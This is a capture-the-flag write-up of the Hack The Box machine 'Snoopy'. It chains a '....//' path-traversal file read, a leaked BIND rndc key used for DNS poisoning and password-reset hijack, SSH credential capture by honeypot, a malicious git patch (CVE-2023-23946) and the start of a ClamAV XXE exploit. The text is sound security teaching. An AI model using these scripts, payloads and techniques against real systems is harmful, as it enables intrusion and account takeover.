---
title: "HTB Snoopy"
draft: false
description: ""
categories: ["HTB"]
tags:
    - zone-transfer
    - BIND DNS
    - File read
    - DNS poisoning
    - nsupdate
    - SSH Honeypot
    - CVE-2023-23946
    - git-apply
    - CVE-2023-20052
    - ClamAV
    - XXE
date: 2023-09-23T14:12:27+05:30
summary: "Snoopy is a Hard Linux box where I start by exploiting a file read vulnerability on the primary site, which allowed me to access BIND DNS config files and the rndc key. With this access, I could update DNS records for the mail server. With control over the mail server, I reset a user's password to access a Mattermost site. During server provisioning, I set up a honeypot to capture SSH credentials. Once inside the server, I exploited a Git apply command vulnerability, enabling me to write to files outside the working copy. Finally, I leveraged an XXE vulnerability in ClamAV's DMG parser to read root's SSH keys."
---



# Snoopy HTB
## Overview
---

> Snoopy is a Hard Linux box where I start by exploiting a file read vulnerability on the primary site, which allowed me to access BIND DNS config files and the rndc key. With this access, I could update DNS records for the mail server. With control over the mail server, I reset a user's password to access a Mattermost site. During server provisioning, I set up a honeypot to capture SSH credentials. Once inside the server, I exploited a Git apply command vulnerability, enabling me to write to files outside the working copy. Finally, I leveraged an XXE vulnerability in ClamAV's DMG parser to read root's SSH keys.

---
## Enumeration
---

### Open Ports

Found three open ports with nmap,
- port 22 → OpenSSH
- port 53 → BIND DNS server
- port 80 → Nginx WebServer

```bash
# Nmap 7.93 scan initiated Thu Jul 20 06:40:44 2023 as: nmap -p22,53,80 -sV -sC -T4 -v -Pn -oA 10.10.11.212/10.10.11.212 10.10.11.212
Nmap scan report for 10.10.11.212
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
| http-methods:
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
❯ http -ph snoopy.htb
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Fri, 22 Sep 2023 08:17:59 GMT
ETag: W/"64417cc6-5b7a"
Last-Modified: Thu, 20 Apr 2023 17:56:22 GMT
Server: nginx/1.18.0 (Ubuntu)
Transfer-Encoding: chunked
```

### port 80 - HTTP

Site headers don't provide any new information about the index page. The index page itself contains links to a domain, `snoopy.htb`, and an email address, `info@snoopy.htb`, in the Contact Us footer. Adding the domain to `/etc/hosts`.

![index-page](./images/index-page.png "Index Page")

The press release can be downloaded via the URL `http://snoopy.htb/download?file=announcement.pdf`. As `announcement.pdf` is used as a parameter, this could potentially be vulnerable to LFI or some kind of file read.

The team page has a few email, which could potentially be usernames,
- cschultz@snoopy.htb
- sbrown@snoopy.htb
- hangel@snoopy.htb
- lpelt@snoopy.htb

The contact page includes a banner that informs users about the current unavailability of the mail server at `mail.snoopy.htb` due to DNS issues.

![presence-of-mail-server](./images/presence-of-mail-server.png "Mailserver DNS issue")

```bash
> dig +noall +nocmd +answer mx @10.10.11.212 mail.snoopy.htb
> dig +noall +nocmd +answer any @10.10.11.212 mail.snoopy.htb
```


![contact-form-error](./images/contact-form-error.png "PHP Tech stack")

On the contact page, there is a form that cannot be submitted successfully. When attempting to send the form, it sends a request to `/forms/contact.php`, but unfortunately, it returns an error message: "Error: Unable to load the 'PHP Email Form' Library!" This suggests that the website is PHP-based. Interestingly, when accessing `index.php`, it returns a 404 error, which is strange.

```bash
❯ http -ph snoopy.htb/index.php
HTTP/1.1 404 Not Found
...snip...

❯ http -ph snoopy.htb/index.html
HTTP/1.1 200 OK
...snip...
```

### port 53 - DNS

Given that TCP is used for DNS, it's probable that it's also used for zone transfers. A DNS zone transfer is a method for replicating DNS records across a group of servers. By initiating a zone transfer request, I can obtain a copy of the zone, potentially revealing other virtual hosts within it. Additionally, because this process typically doesn't necessitate authentication and I have a domain, this can be easily accomplished using the `dig` command.

```bash
> dig +noall +nocmd +answer axfr @10.10.11.212 snoopy.htb
snoopy.htb.     86400   IN  SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.     86400   IN  NS  ns1.snoopy.htb.
snoopy.htb.     86400   IN  NS  ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN  A   172.18.0.3
mm.snoopy.htb.      86400   IN  A   127.0.0.1
ns1.snoopy.htb.     86400   IN  A   10.0.50.10
ns2.snoopy.htb.     86400   IN  A   10.0.51.10
postgres.snoopy.htb.    86400   IN  A   172.18.0.2
provisions.snoopy.htb.  86400   IN  A   172.18.0.4
www.snoopy.htb.     86400   IN  A   127.0.0.1
snoopy.htb.     86400   IN  SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
```

The presence of IP addresses in the `172.18.x.x` range suggests that the associated applications may be containerized. Unfortunately, the only domains that resolve to new sites are:
- `snoopy.htb`
- `mm.snoopy.htb`

Fuzzing for other subdomains using `wfuzz`, didn't find anything other than the `mm` vhost. Adding it to `/etc/hosts`.

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snoopy.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000582:   200        0 L      141 W      3132 Ch     "mm"
```
### port 80 - mm.snoopy.htb

This vhost seems to be a [Mattermost](https://docs.mattermost.com/overview/index.html) instance.
> Mattermost is an open-source, self-hostable online chat service with file sharing, search, and integrations. It is designed as an internal chat for organisations and companies, and mostly markets itself as an open-source alternative to Slack and Microsoft Teams.

```bash
> http mm.snoopy.htb | html2text
## Cannot connect to Mattermost

* * *

We're having trouble connecting to Mattermost. If refreshing this page (Ctrl+R
or Command+R) does not work, please verify that your computer is connected to
the internet.



To use Mattermost, please enable JavaScript.
```


![mattermost-index-page](./images/mattermost-index-page.png)

This will eventually lead to a Mattermost login page, which has two links: _Don't have an account_ and _Forgot your password?_.

![mattermost-login](./images/mattermost-login.png)

<!-- ![mattermost-access-problem](https://i.imgur.com/q6Iph4A.png) -->

The _Don't have an account_ link just instructs users to contact the workspace admin and check their inbox for an invitation. The _Forgot your password_ link offers the functionality to reset a password based on the entered email ID. However, it appears that the reset process involves sending an email to the provided email address, which I don't have access to.

![forgot-password](./images/forgot-password.png)

Unfortunately, using the CEO's email instead returns an 500 error

```json
{
	"id":"api.user.send_password_reset.send.app_error",
	"message":"Failed to send password reset email successfully.",
	"detailed_error":"",
	"request_id":"4hqhjmk9qins3rq978yobc3w4w",
	"status_code":500
}
```

![cschultz-password-reset-error](./images/cschultz-password-reset-error.png "Password reset error")

The fact that there are no MX records for the domains supports the banner's claim that the mail server is down due to DNS issues. This could explain the email functionality problems.

```bash
> dig +nocmd +answer mx snoopy.htb @10.10.11.212
> dig +nocmd +answer mx mm.snoopy.htb @10.10.11.212
```

---
## Initial Foothold
---
### File read exploit

Revisiting the download endpoint, the press release archive doesn't contain significant information. However, the download endpoint for the press release is intriguing as it directly includes the parameter file's content in a ZIP format.

```bash
> unzip -l press_release.zip
Archive:  press_release.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    30732  2023-04-20 17:52   announcement.pdf
 11425609  2023-04-20 17:52   snoopysec_marketing.mp4
---------                     -------
 11456341                     2 files
```


![download-inclusion](./images/download-inclusion.png "Press release download request")

Standard directory traversal methods are not effective, but it's possible to bypass this by using `....//` instead of `../`. Furthermore, based on the `Content-Disposition filename` field in the response, it appears that the response contains binary data in zip format.

![download-zip-file-read](./images/download-zip-file-read.png "File read exploit")

The zip file contains the `/etc/hostname` file which is evident by extracting the contents of the resulting zip archive.

```bash
❯ curl -s http://snoopy.htb/download\?file\=....//....//...//....//....//etc/hostname --output lfi.zip
❯ unzip -l lfi.zip
Archive:  lfi.zip
warning [lfi.zip]:  224 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  Length      Date    Time    Name
---------  ---------- -----   ----
       11  2023-02-24 06:05   press_package/./etc/hostname
---------                     -------
       11                     1 file
❯ unzip lfi.zip
Archive:  lfi.zip
warning [lfi.zip]:  224 extra bytes at beginning or within zipfile
  (attempting to process anyway)
 extracting: press_package/etc/hostname
❯ cat press_package/etc/hostname
snoopy.htb
```

To simplify the process, I wrote a Python script to automate these steps and achieve the desired outcome.

```python
#!/usr/bin/env python

import re
import sys
from zipfile import ZipFile

import requests
import urllib3

fileName = sys.argv[1]
zipName = "file_read_download.zip"

username = ""
password = ""
url = "http://snoopy.htb/download"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

params = {"file": f"....//....//....//....//{fileName}"}


def extract_data(zipName):
    with ZipFile(zipName, "r") as zipObj:
        zipObj.extractall("unzipped_content")
        unzipped_file = zipObj.namelist()[0]
        with open(f"unzipped_content/{unzipped_file}", "r") as file:
            content = file.read()
            print(content)


try:
    session = requests.Session()

    response = session.get(url=url, params=params, proxies=proxies, verify=False)
    # print(response.text)

    if not response.content:
        raise Exception("File doesn't exist")

    # streaming download
    with open(zipName, "wb") as file:
        for chunk in response.iter_content(chunk_size=1024):
            if chunk:
                file.write(chunk)

    extract_data(zipName)

except Exception as e:
    print(f"Exception raised: {e}")
```

```bash
> python zip_file_read.py /etc/hostname
snoopy.htb
```

Now that I can read `/etc/passwd`, found a few users with login shells.

```bash
> python zip_file_read.py /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

Looking at `/proc/self/*` files confirms that the website is PHP based.

```bash
> python zip_file_read.py /proc/self/cmdline
php-fpm: pool www
```

Using the path for the current working directory, `/proc/self/cwd/` can be used to query the source code of the website.

_index.html_
```html
> python zip_file_read.py /proc/self/cwd/index.html
...snip...
  <!-- =======================================================
  * Template Name: SnoopySec
  * Updated: Mar 10 2023 with Bootstrap v5.2.3
  * Template URL: https://bootstrapmade.com/SnoopySec-bootstrap-business-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
...snip...
```

This attempts to create a ZIP archive from files in the `press_package/` directory. It replaces the `../` sequence from the file parameter which is why `....//` bypasses the sanitization. The resultant file is then added to the archive.

```php
> python zip_file_read.py /proc/self/cwd/download.html
Exception raised: File doesn't exist

> python zip_file_read.py /proc/self/cwd/download.php
<?php

$file = $_GET['file'];
$dir = 'press_package/';
$archive = tempnam(sys_get_temp_dir(), 'archive');
$zip = new ZipArchive();
$zip->open($archive, ZipArchive::CREATE);

if (isset($file)) {
        $content = preg_replace('/\.\.\//', '', $file);
        $filecontent = $dir . $content;
        if (file_exists($filecontent)) {
            if ($filecontent !== '.' && $filecontent !== '..') {
                $content = preg_replace('/\.\.\//', '', $filecontent);
                $zip->addFile($filecontent, $content);
            }
        }
} else {
        $files = scandir($dir);
        foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                        $zip->addFile($dir . '/' . $file, $file);
                }
        }
}

$zip->close();
header('Content-Type: application/zip');
header("Content-Disposition: attachment; filename=press_release.zip");
header('Content-Length: ' . filesize($archive));

readfile($archive);
unlink($archive);

?>

```

The nginx configuration file includes config files for the virtual hosts, which could potentially give juicy information about the vhost.

```bash
> python zip_file_read.py /etc/nginx/nginx.conf
...snip...
    ##
    # Virtual Host Configs
    ##

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
...snip...
```

As expected, there is a single configuration file for `mm.snoopy.htb`. It appears that the Mattermost instance hosts an API which uses WebSockets, and is running on localhost port 8056.

```bash
> python zip_file_read.py /etc/nginx/conf.d/mattermost.conf
Exception raised: File doesn't exist
> python zip_file_read.py /etc/nginx/conf.d/postgres.conf
Exception raised: File doesn't exist
> python zip_file_read.py /etc/nginx/conf.d/provisions.conf
Exception raised: File doesn't exist
> python zip_file_read.py /etc/nginx/conf.d/www.conf
Exception raised: File doesn't exist
> python zip_file_read.py /etc/nginx/conf.d/mm.conf
server {
   listen 80;
   server_name mm.snoopy.htb;

   http2_push_preload on; # Enable HTTP/2 Server Push

   location ~ /api/v[0-9]+/(users/)?websocket$ {
       proxy_set_header Upgrade $http_upgrade;
...snip...
...snip...
       proxy_http_version 1.1;
       proxy_pass http://localhost:8065;
   }
   location / {
       client_max_body_size 50M;
       proxy_set_header Connection "";
...snip...
...snip...
       proxy_pass http://localhost:8065;
   }
}

```

### DNS Poisoning

While fuzzing for other interesting files available via the file read vulnerability using `ffuf`, I found a few BIND config files, which relates to DNS (port 53).

```bash
> ffuf -c -w /home/kali/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u 'http://snoopy.htb/download?file=....//....//....//....//FUZZ' -t 100 -fs 0
...snip...
...snip...
/etc/bind/named.conf    [Status: 200, Size: 497, Words: 2, Lines: 2, Duration: 2737ms]
/etc/bind/named.conf.local [Status: 200, Size: 391, Words: 2, Lines: 3, Duration: 2747ms]
/etc/bind/named.conf.options [Status: 200, Size: 625, Words: 2, Lines: 1, Duration: 2765ms]
/etc/bind/zones.rfc1918 [Status: 200, Size: 320, Words: 3, Lines: 2, Duration: 2765ms]
...snip...
```

The primary BIND configuration file, located at `/etc/bind/named.conf`, references a local config file and an `rndc-key` → `BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=`. BIND comes with a CLI tool, `rndc` that helps administer the DNS service for BIND. The `rndc` key is a shared key used to prevent unauthorized access, which means with this key I could make changes to the DNS configuration.

```bash
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

The local config file provides two significant details:
- The zone file is located at `/var/lib/bind/db.snoopy.htb` and it can be updated using the `rndc-key`.
- Zone transfers are allowed over the IP range `10.0.0.0/8`, which explains why I was able to initiate the zone transfer earlier.

As expected, the zone file doesn't have any records for a mail server.

```bash
> python zip_file_read.py /etc/bind/named.conf.local
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};

> python zip_file_read.py /var/lib/bind/db.snoopy.htb
$ORIGIN .
$TTL 86400      ; 1 day
snoopy.htb              IN SOA  ns1.snoopy.htb. ns2.snoopy.htb. (
                                2022032612 ; serial
                                3600       ; refresh (1 hour)
                                1800       ; retry (30 minutes)
                                604800     ; expire (1 week)
                                86400      ; minimum (1 day)
                                )
                        NS      ns1.snoopy.htb.
                        NS      ns2.snoopy.htb.
$ORIGIN snoopy.htb.
$TTL 86400      ; 1 day
mattermost              A       172.18.0.3
mm                      A       127.0.0.1
ns1                     A       10.0.50.10
ns2                     A       10.0.51.10
mattermost              A       172.18.0.3
postgres                A       172.18.0.2
provisions              A       172.18.0.4
www                     A       127.0.0.1

```

Given that there are no records for `mail.snoopy.htb` in the zone file and I possess the `rndc-key`, it's possible to add a DNS record pointing to my attack box. Since my `tun0` IP falls within the `10.0.0.0/8` range, I can initiate the zone transfer. Dynamic DNS records can be updated using the [nsupdate](https://www.ibm.com/docs/en/aix/7.3?topic=n-nsupdate-command) command, allowing me to add an A record for `mail.snoopy.htb` that directs to my attack box.

```bash
❯ nsupdate
> server 10.10.11.212
> key hmac-sha256:rndc-key BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
> zone snoopy.htb
> update add mail.snoopy.htb 86400 IN A 10.10.14.80
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; ZONE SECTION:
;snoopy.htb.            IN  SOA

;; UPDATE SECTION:
mail.snoopy.htb.    86400   IN  A   10.10.14.80

> send
```

Querying the mail server domain using dig confirms the new entry I just added.

```bash
> dig +noall +nocmd +answer @10.10.11.212 mail.snoopy.htb
mail.snoopy.htb.    86400   IN  A   10.10.14.80
```

To test the password reset process, I set up an SMTP server on my attack box to receive password reset emails. Instead of using Python's outdated `smtpd` module, I chose to use the [aiosmtp](https://aiosmtpd.readthedocs.io) module. I still need email addresses of existing users, fortunately, these email addresses conveniently listed on the team page.

To test the password reset, I set up an SMTP server on my attack box using [aiosmtp](https://aiosmtpd.readthedocs.io) instead of Python's outdated `smtpd` module. The necessary email addresses for testing can be found from the team page, where they were conveniently listed.

![team-emails](./images/team-emails.png "Team emails")

I used Charles Shultz's email address, `cschultz@snoopy.htb` since they are the CEO and and upon testing, immediately got a response on the SMTP server. The email contained a password reset link with a token.

```bash
> aiosmtpd -n -l 10.10.14.80:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']

MIME-Version: 1.0
Auto-Submitted: auto-generated
Message-ID: <zrwr8rz5nzi4z5k6-1689887681@mm.snoopy.htb>
From: "No-Reply" <no-reply@snoopy.htb>
Date: Thu, 20 Jul 2023 21:14:41 +0000
Subject: [Mattermost] Reset your password
Content-Transfer-Encoding: 8bit
Precedence: bulk
Reply-To: "No-Reply" <no-reply@snoopy.htb>
To: cschultz@snoopy.htb
Content-Type: multipart/alternative;
 boundary=d971ea2ff7c8917b05af02f991d6a5e58be481fee9249b38ce66fd1e7b2e
X-Peer: ('10.10.11.212', 43424)

--d971ea2ff7c8917b05af02f991d6a5e58be481fee9249b38ce66fd1e7b2e
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=UTF-8

Reset Your Password
Click the button below to reset your password. If you didn=E2=80=99t reques=
t this, you can safely ignore this email.

Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dxdrwb=
zawno1mfg7iniabra3n336d577r3pmfduh6kpaddfbbsrc6f4bhkhcz979b )

The password reset link expires in 24 hours.
...snip...
...snip...
```

Since the encoding method used for the response is 'Quoted printable', used to decode 8-bit data in a 7-bit data path, need to decode it before using the token to reset the password. Not sure why the `=` was resolved, but based on the rest of the email it could an indictor of the end of line for SMTP or MIME.

![decode-mime-url](./images/decode-mime-url.png "Decode password reset link")

![password-reset](./images/password-reset.png)

After successfully resetting the password, I could log in as Charles Schultz (cschultz) on Mattermost. In the Town Square channel, I noticed a conversation where cbrown mentioned something about provisioning servers on demand, which is intriguing.

![devsecops-townsquare](./images/devsecops-townsquare.png "Mattermost Devsecops server")

Going through the available commands on the server, there's one named `provision-server`, which pops up a form to provision a new server.

![Devsecops-commands](./images/Devsecops-commands.png)

Upon submitting the server provision request form, I received a simple 'Form Submitted' message and a direct message from cbrown, asking if I can log in.

![server-provision](./images/server-provision.png "Provision a new server")

Started a tcpdump capture on tun0 and applied source and destination filtering. It appears the server actually attempts to establish a TCP connection to port 2222 on my attack box.

```bash
> _ tcpdump -i tun0 not src port 80 and not dst port 80
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:10:57.520219 IP snoopy.htb.45084 > 10.10.14.80.2222: Flags [S], seq 2880465282, win 64240, options [mss 1340,sackOK,TS val 3208739704 ecr 0,nop,wscale 7], length 0
...snip...
```

Given the context of a new server being provisioned, login attempts, and a TCP connection to port 2222, it's possible that an SSH connection is being established. A netcat listener on port 2222 confirms that `paramiko` is being used to initiate an SSH connection.

```bash
> nc -nlvp 2222
listening on [any] 2222 ...
Connection from 10.10.11.212.
Connection from 10.10.11.212:50278.
SSH-2.0-paramiko_3.1.0
```

By utilizing an SSH honeypot like [Cowrie](https://cowrie.readthedocs.io/en/latest/), I was able to capture login credentials being used for SSH access. These logs reveal that `cbrown` is attempting to log in. Since `paramiko` suggests automated action, there's a possibility that these credentials could be reused.

```bash
> docker run -p 2222:2222/tcp cowrie/cowrie
2023-07-21T01:27:13+0000 [-] Python Version 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110]
2023-07-21T01:27:13+0000 [-] Twisted Version 22.10.0
2023-07-21T01:27:13+0000 [-] Cowrie Version 2.5.0
...snip...
...snip...
2023-07-21T01:29:25+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b'cbrown'/b'sn00pedcr3dential!!!'] failed
2023-07-21T01:29:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' failed auth b'password'
2023-07-21T01:29:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
```

[This](https://github.com/droberson/ssh-honeypot) looked like another intriguing SSH honeypot project, although it may require additional manual setup compared to Cowrie.

```bash
> make
> ssh-keygen -t rsa -f ./ssh-honeypot.rsa
> bin/ssh-honeypot -r ./ssh-honeypot.rsa
> bin/ssh-honeypot -r ./ssh-honeypot.rsa -p 2222
[Thu Jul 20 20:43:25 2023] ssh-honeypot 0.2.0 started on port 2222. PID 132349
[Thu Jul 20 20:44:34 2023] 10.10.11.212 cbrown sn00pedcr3dential!!!
[Thu Jul 20 20:45:34 2023] HASSHServer: 10.10.14.80 6c4602ed7d5fded0306a85b6f99ec588 sport: 2222 ttl: 64
[Thu Jul 20 20:45:34 2023] HASSH: 10.10.11.212 a704be057881f0b1d623cd263e477a8b sport: 58496 ttl: 64
```


### Shell as cbrown

As anticipated, `cbrown`'s' credentials are reused for SSH login. Additionally, the user `cbrown` is part of the `devops` group, although there don't seem to be any directories or files owned or writable by it.

```bash
> pc
[21:38:25] Welcome to pwncat 🐈!                                                                                      __main__.py:164
[21:38:28] snoopy.htb:22: registered new host w/ db                                                                    manager.py:957
(local) pwncat$
(remote) cbrown@snoopy.htb:/home/cbrown$ id
uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
sbrown@snoopy:~$ find / -group devops 2>/dev/null
sbrown@snoopy:~$ find / -group devops -writable 2>/dev/null

```


---
## Horizontal Privilege Escalation
----

### CVE-2023-23946

The user, `cbrown` has sudo privileges, and can apply a git patch as `sbrown`.

```bash
(remote) cbrown@snoopy.htb:/home/cbrown$ sudo -l
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
(remote) cbrown@snoopy.htb:/home/cbrown$ git --version
git version 2.34.1
```

While searching for exploits related to git apply, found an [security advisory](https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh) and a corresponding CVE, [CVE-2023-23946](https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/). This vulnerability allows an attacker to write to files outside the working copy by using a symbolic link through a malicious patch.
I couldn't find any public PoCs for this CVE, the closest I came was the commit used to fix the vulnerability itself:
- [apply: fix writing behind newly created symbolic links · git/git@fade728](https://github.com/git/git/commit/fade728df1221598f42d391cf377e9e84a32053f)
- [openembedded-core/meta/recipes-devtools/git/files/CVE-2023-23946.patch](https://github.com/victronenergy/openembedded-core/blob/aa7f0169a4a77a29c859a3678be389a729da7387/meta/recipes-devtools/git/files/CVE-2023-23946.patch#L47)

Ideally, git has safeguards when applying patches ensuring anything malicious isn't allowed, like creating files in places they shouldn't be based on a symbolic link. According to the exploit, if the patch itself is a symbolic link this can be bypassed. I can use a malicious patch file that will use the symlink pointing to `sbrown`'s SSH directory, to write a new `authorized_keys` file which contains my public key ensuring I can login using the identity key.

```bash
(remote) cbrown@snoopy.htb:/tmp$ mkdir repo
(remote) cbrown@snoopy.htb:/tmp$ cd repo
(remote) cbrown@snoopy.htb:/tmp/repo$ git init -q
(remote) cbrown@snoopy.htb:/tmp/repo$ ln -s /home/sbrown/.ssh/ symlink
(remote) cbrown@snoopy.htb:/tmp/repo$ vi patch
```

_Patch file_
```diff
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDwvc5b566DlqhUovNwyExA4Jq/0ftC32rC0MLgeQbuMXlQGDdjk44FxSPgaaTWTBlPiUEWprrA0lW6NAX+CZF3t6r2Aw9sxhZGa09AMvbJPeGRtaVkfoj7RnZ1L8YXqTdhGRgsjwexxiYIvgMIBmngEJ/B0hf/ixbA2olly1wSnAHDOCTC/+FSOx74utS57I+iROzwTXr9mGs4z0acjrS08kKBlO5qqApStQUu8PXZaHeyh3k0l6CJ6PMO0RXrcOQQz0ngJ05t8tJAZihi8ALzV/IN98JVhqn+CkV/FY6AnYcsv1kXcWB6hIh29fHyhe1jFrFA/HK6nsXIzEYoJVchyi65cVGT8B6txbBheiY+SCZcosy1gY3ANeVVkW0ybKtL9uBJuH8s4gCFq5pXomVToXiqDSkrL+hjdHfIgdLDSPtUh1/BF6fepJGG4MgeA/KY5cS+TFtnAVF4m4L1ZuHR32qZoK2o7GeRUiALuZ0MYY8xXOArwkAH9pa/sa51L0= kali@kali
```

However, when attempting to apply the patch, I get a permission error. Not entirely sure the reason, but I am assuming since the symlink points to a location cbrown doesn't have access to could be reason.

```bash
(remote) cbrown@snoopy.htb:/tmp/repo$ sudo -u sbrown /usr/bin/git apply -v patch
Checking patch symlink => renamed-symlink...
Checking patch renamed-symlink/authorized_keys...
warning: unable to unlink 'symlink': Permission denied
error: unable to write file 'renamed-symlink' mode 120000: No such file or directory
```

In an attempt to resolve this, changed the directory permissions to `rwx` for everybody which seemed to fix the issue. Applying the patch now successfully creates a new `authorized_keys` file with my public key in it file.

```bash
(remote) cbrown@snoopy.htb:/tmp/repo$ chmod 777 /tmp/repo
(remote) cbrown@snoopy.htb:/tmp/repo$ sudo -u sbrown /usr/bin/git apply -v patch
Checking patch symlink => renamed-symlink...
Checking patch renamed-symlink/authorized_keys...
Applied patch symlink => renamed-symlink cleanly.
Applied patch renamed-symlink/authorized_keys cleanly.
(remote) cbrown@snoopy.htb:/tmp/repo$ ls
patch  renamed-symlink
```

Now using the identity key, I can login as `sbrown` via SSH.

```bash
> ssh sbrown@snoopy.htb -i id_rsa.sbrown
...snip...
Last login: Fri Aug  4 11:28:23 2023 from 10.10.14.77
sbrown@snoopy:~$ id
uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)
sbrown@snoopy:~$
```

---
## Vertical Privilege Escalation
----

### CVE 2023-20052

The user, `sbrown` again has sudo privileges to run ClamAV on specific files in the `/home/sbrown/scanfiles` directory with the debug flag set. The debug flag will _Enable libclamav's debug messages_

```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

```bash
sbrown@snoopy:~$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

Going through the help message, the `-f` option reads files from the provided file and prints each line before processing them, as it expects these to be filenames. Additionally, there's a `--copy` option designed to copy the infected file to a specified directory. However, due to the regex pattern `^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$`, it seems both these options cannot be used for escalation.

I did find a CVE, [CVE 2023-20052](https://www.pingsafe.com/blog/cve-2023-20052-cisco-clamav-xxe-vulnerability/) for ClamAV's DMG file parser for versions ≤ 1.0.0 that exploits a XXE vuln. Exploiting this vulnerability involves creating a crafted DMG file that substitutes an XML entity, ultimately enabling unauthorized access to read files through ClamAV.
To exploit this CVE, I used a publicly available [PoC](https://github.com/nokn0wthing/CVE-2023-20052), which includes a Docker container for generating a DMG image and injecting the XXE payload. By using the binary block editor to inject the XXE payload, I can read root's SSH key at `/root/.ssh/id_rsa`.

```bash
> docker run -v $(pwd):/exploit -it cve-2023-20052 bash
root@ec8a06805207:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 542
Total directory bytes: 782
Path table size(bytes): 10
Max brk space used 0
52 extents written (0 MB)
Processing DDM...
